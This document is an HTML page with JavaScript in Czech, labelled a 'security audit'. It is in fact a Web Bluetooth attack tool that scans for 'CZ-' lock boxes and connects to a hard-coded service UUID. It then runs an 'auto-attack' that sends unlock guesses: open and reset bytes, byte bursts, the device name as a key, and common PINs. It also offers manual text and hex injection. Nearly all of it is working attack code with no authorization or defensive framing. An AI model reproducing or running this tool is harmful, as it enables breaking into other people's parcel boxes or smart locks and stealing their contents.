<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BOX SECURITY AUDIT v3.1 🔱</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #050505; color: #00ff41; padding: 15px; margin: 0; }
        .header { border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; text-align: center; }
        .panel { border: 1px solid #00ff41; padding: 15px; border-radius: 5px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); }
        button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 12px; margin: 5px 0; cursor: pointer; width: 100%; font-size: 14px; font-weight: bold; text-transform: uppercase; }
        button:hover { background: #00ff41; color: #000; }
        button:disabled { border-color: #444; color: #444; cursor: not-allowed; }
        input { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; width: calc(100% - 24px); margin-bottom: 10px; }
        #log { background: #000; border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; font-size: 11px; color: #00ff41; line-height: 1.4; }
        .status-bar { font-size: 12px; margin-bottom: 10px; color: #fff; }
        .danger { border-color: #ff0000; color: #ff0000; }
        .danger:hover { background: #ff0000; color: #000; }
    </style>
</head>
<body>

<div class="header">
    <h2>SYSTEM AUDIT: CZ-BOX 🔱</h2>
</div>

<div class="panel">
    <div class="status-bar" id="status">STATUS: DISCONNECTED</div>
    <button onclick="connect()">1. NAVÁZAT SPOJENÍ (SCAN)</button>
</div>

<div class="panel">
    <strong>AUTOMATICKÝ ÚTOČNÝ VEKTOR:</strong>
    <button class="danger" id="attackBtn" onclick="startAutoAttack()" disabled>SPUSTIT AUTO-ATTACK (BRUTEFORCE)</button>
</div>

<div class="panel">
    <strong>MANUÁLNÍ VSTUP (TEXT/PIN):</strong>
    <input type="text" id="userInput" placeholder="Zadej PIN nebo název boxu">
    <button onclick="sendManualText()">ODESLAT JAKO TEXT (UTF-8)</button>
    <button onclick="sendManualHex()">ODESLAT JAKO HEX (BYTE)</button>
</div>

<div id="log">--- INICIALIZACE SYSTÉMU ---<br></div>

<script>
    let device, server, service, characteristic;
    let deviceName = "";

    // OPRAVENÁ UUID S POMLČKAMI (Zjištěno z tvých dat v nRF Connect)
    const SERVICE_UUID = '7a626f78-0ad1-46c3-9fc9-fbd4bdc5d197';
    const CHARACTERISTIC_UUID = '7a626f7a-0ad1-46c3-9fc9-fbd4bdc5d197';

    function log(msg) {
        const logDiv = document.getElementById('log');
        const now = new Date().toLocaleTimeString();
        logDiv.innerHTML += `[${now}] > ${msg}<br>`;
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function connect() {
        try {
            log("Skenuji okolí pro CZ- zařízení...");
            // Chrome vyžaduje přesný formát UUID, jinak hodí TypeError
            device = await navigator.bluetooth.requestDevice({
                filters: [{ namePrefix: 'CZ-' }],
                optionalServices: [SERVICE_UUID]
            });

            log(`Nalezeno: ${device.name}. Připojuji se...`);
            deviceName = device.name;
            
            server = await device.gatt.connect();
            service = await server.getPrimaryService(SERVICE_UUID);
            characteristic = await service.getCharacteristic(CHARACTERISTIC_UUID);

            document.getElementById('status').innerText = `STATUS: CONNECTED [${deviceName}]`;
            document.getElementById('attackBtn').disabled = false;
            log("✅ SPOJENÍ NAVÁZÁNO. Exploit kanál otevřen.");

        } catch (error) {
            log("❌ CHYBA: " + error);
        }
    }

    async function sendRaw(data) {
        if (!characteristic) return;
        try {
            await characteristic.writeValue(data);
            return true;
        } catch (e) {
            log(`❌ Paket selhal: ${e.message}`);
            return false;
        }
    }

    async function startAutoAttack() {
        log("🚀 SPUŠTĚN AUTOMATICKÝ ÚTOK...");
        
        const vectors = [
            { name: "Global Open", data: new Uint8Array([0x01]) },
            { name: "Zero Reset", data: new Uint8Array([0x00]) },
            { name: "Double Confirm", data: new Uint8Array([0x01, 0x01]) },
            { name: "Full Burst", data: new Uint8Array([0xFF, 0xFF, 0xFF, 0xFF]) },
            { name: "Device Name Key", data: new TextEncoder().encode(deviceName) },
            { name: "Common PIN 0000", data: new TextEncoder().encode("000000") },
            { name: "Common PIN 1234", data: new TextEncoder().encode("123456") }
        ];

        for (const v of vectors) {
            log(`Testuji vektor: ${v.name}...`);
            const success = await sendRaw(v.data);
            if (success) log(`✅ Paket ${v.name} doručen.`);
            await new Promise(r => setTimeout(r, 800)); // Mírně delší pauza pro stabilitu
        }
        log("🏁 ÚTOK DOKONČEN. Sleduj reakci zámku.");
    }

    async function sendManualText() {
        const val = document.getElementById('userInput').value;
        if (!val) return log("⚠️ Zadej text.");
        log(`Posílám text: ${val}`);
        const success = await sendRaw(new TextEncoder().encode(val));
        if (success) log("✅ Text odeslán.");
    }

    async function sendManualHex() {
        const val = document.getElementById('userInput').value;
        if (!val) return log("⚠️ Zadej HEX (např. 01ff).");
        try {
            const hex = new Uint8Array(val.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
            log(`Posílám HEX: ${val}`);
            const success = await sendRaw(hex);
            if (success) log("✅ HEX odeslán.");
        } catch (e) {
            log("❌ Neplatný HEX formát.");
        }
    }
</script>

</body>
</html>
